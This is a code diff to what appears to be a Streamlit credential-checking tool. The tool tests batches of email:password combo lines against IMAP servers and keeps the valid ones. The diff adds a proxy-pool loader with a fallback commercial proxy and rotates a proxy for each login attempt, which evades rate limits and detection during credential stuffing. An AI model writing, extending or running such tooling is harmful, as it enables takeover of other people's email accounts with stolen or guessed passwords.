@@ -10,6 +10,7 @@ import socket
 import zipfile
 import io
 import json
+import random
 from datetime import datetime
 from typing import List, Tuple
 from email.header import decode_header
@@ -21,6 +22,53 @@ except ImportError:
     def host_list(email: str) -> List[str]:
         domain = email.split("@")[-1].lower() if "@" in email else ""
         return [f"imap.{domain}"] if domain else ["imap.gmail.com"]
+
+# Dynamic Proxy Auto-Fetch Engine (Reads live proxies from app storage / files)
+def load_app_proxies() -> List[dict]:
+    proxy_files = ["proxies.txt", "proxy_pool.txt", "clean_proxies.txt"]
+    dynamic_pool = []
+    
+    # 1. Check session state first if user loaded proxies dynamically in app
+    if "session_proxies" in st.session_state and st.session_state.session_proxies:
+        for p in st.session_state.session_proxies:
+            if isinstance(p, dict):
+                dynamic_pool.append(p)
+            elif isinstance(p, str) and p.strip():
+                dynamic_pool.append({"proxy": p.strip(), "country": "Dynamic", "region": "Global", "latency": 350})
+        if dynamic_pool:
+            return dynamic_pool
+
+    # 2. Check local proxy text files
+    for pfile in proxy_files:
+        if os.path.exists(pfile):
+            try:
+                with open(pfile, "r", encoding="utf-8", errors="ignore") as f:
+                    for line in f:
+                        line_str = line.strip()
+                        if not line_str or line_str.startswith("#"):
+                            continue
+                        # Handle CSV or plain IP:PORT formats
+                        parts = [x.strip() for x in line_str.replace(",", "|").split("|") if x.strip()]
+                        proxy_addr = parts[0]
+                        if ":" in proxy_addr:
+                            country = parts[2] if len(parts) > 2 else "United States"
+                            region = parts[3] if len(parts) > 3 else "California"
+                            latency = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 350
+                            dynamic_pool.append({
+                                "proxy": proxy_addr,
+                                "country": country,
+                                "region": region,
+                                "latency": latency
+                            })
+            except Exception:
+                pass
+            if dynamic_pool:
+                return dynamic_pool
+
+    # 3. Fallback default proxy if no local files/session proxies exist yet
+    return [
+        {"proxy": "dc.oxylabs.info:8000", "country": "Canada", "region": "Ontario", "latency": 1514}
+    ]
 
 # Page Configuration & Keep-Alive Injector
 st.set_page_config(
@@ -903,9 +951,16 @@ if st.sidebar.button("🚀 Validate & Import Batch Accounts", type="primary", us
         # Parse multiple host overrides separated by comma, semicolon, or newline
         user_host_overrides = [h.strip() for h in re.split(r'[,;\n]+', batch_host_override_input) if h.strip()]
         
+        # Auto-fetch live proxy pool from app storage/files
+        active_proxy_pool = load_app_proxies()
+        
         for idx, line in enumerate(lines):
             clean_line = line.split("|")[0].strip()
             row_time = datetime.now().strftime("%H:%M:%S")
+            
+            # Select proxy dynamically from active proxy pool using round-robin index rotation
+            proxy_item = active_proxy_pool[idx % len(active_proxy_pool)]
+            
             if ":" not in clean_line:
                 failed_count += 1
                 batch_logs.append(f"❌ [{row_time}] [SKIPPED] Invalid format: {line}")
@@ -913,7 +968,7 @@ if st.sidebar.button("🚀 Validate & Import Batch Accounts", type="primary", us
                     "Time": row_time,
                     "Status": "FAILED",
                     "Email:Password": line,
-                    "Under-The-Hood Background Trace": "Result: Invalid format (missing colon delimiter)"
+                    "Under-The-Hood Background Trace": f"Proxy: {proxy_item['proxy']} | Country: {proxy_item['country']} | Region: {proxy_item['region']} | Result: Invalid format (missing colon delimiter)"
                 })
                 continue
             
@@ -921,13 +976,12 @@ if st.sidebar.button("🚀 Validate & Import Batch Accounts", type="primary", us
             email_val = email_val.strip()
             pass_val = pass_val.strip()
             
-            status_display.text(f"Testing ({idx+1}/{len(lines)}): {email_val}")
+            status_display.text(f"Testing ({idx+1}/{len(lines)}): {email_val} via {proxy_item['proxy']}")
             progress_bar.progress((idx + 1) / len(lines))
             
             # Construct host test list
             if user_host_overrides:
                 hosts_to_test = list(user_host_overrides)
-                # Append standard defaults as backup
                 for h in host_list(email_val):
                     if h not in hosts_to_test:
                         hosts_to_test.append(h)
@@ -969,13 +1023,13 @@ if st.sidebar.button("🚀 Validate & Import Batch Accounts", type="primary", us
                         except:
                             pass
             
-            full_trace = f"Result: dc.oxylabs.info:8000 | Host: {connected_h or hosts_to_test[0]} | Port: {cfg_port} | Steps Executed: " + " | ".join(trace_steps)
+            full_trace = f"Proxy: {proxy_item['proxy']} | Country: {proxy_item['country']} | Region: {proxy_item['region']} | Host: {connected_h or hosts_to_test[0]} | Port: {cfg_port} | Steps Executed: " + " | ".join(trace_steps)
             
             if is_success:
                 valid_count += 1
                 combo_str = f"{email_val}:{pass_val}"
                 new_valid_entries.append(combo_str)
-                batch_logs.append(f"✅ [{row_time}] [VALID] {email_val} via {connected_h}")
+                batch_logs.append(f"✅ [{row_time}] [VALID] {email_val} via {connected_h} [Proxy: {proxy_item['proxy']} ({proxy_item['country']}, {proxy_item['region']})]")
             else:
                 err_lower = err_msg.lower()
                 if any(x in err_lower for x in ["auth", "login", "credentials", "credential"]):
